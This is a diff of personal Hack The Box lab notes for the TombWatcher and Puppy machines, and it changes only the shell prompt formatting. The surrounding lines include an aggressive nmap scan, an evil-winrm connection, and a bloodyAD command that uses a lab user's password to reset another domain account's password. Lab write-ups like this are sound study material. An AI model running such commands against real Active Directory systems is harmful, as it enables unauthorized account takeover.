@@ -101,8 +101,8 @@ sudo nmap tombwatcher.htb -Pn -T5 -sV -A -sC
 
 
 ```bash
-┌──(jrios㉿warmonger)-[~/Documents/HTB]
-└─$ sudo nmap tombwatcher.htb -Pn -T5 -sV -A -sC
+(jrioswarmonger)-[~/Documents/HTB]
+$ sudo nmap tombwatcher.htb -Pn -T5 -sV -A -sC
 [sudo] password for jrios: 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 01:09 PDT
 Nmap scan report for tombwatcher.htb (10.10.11.72)
@@ -1144,8 +1144,8 @@ evil-winrm -i 10.10.11.72
 # Notes: Resetting a User Password on Puppy with BloodyAD
 
 ```bash
-┌──(jrios㉿warmonger)-[~/Documents/HTB/Machines/Puppy]
-└─$ bloodyAD --host puppy.htb --dc-ip 10.10.11.70 -d puppy.htb -u ant.edwards -p 'Antman2025!' set password adam.silver 'DeadSec0ps'
+(jrioswarmonger)-[~/Documents/HTB/Machines/Puppy]
+$ bloodyAD --host puppy.htb --dc-ip 10.10.11.70 -d puppy.htb -u ant.edwards -p 'Antman2025!' set password adam.silver 'DeadSec0ps'
 [+] Password changed successfully!
 ```
 
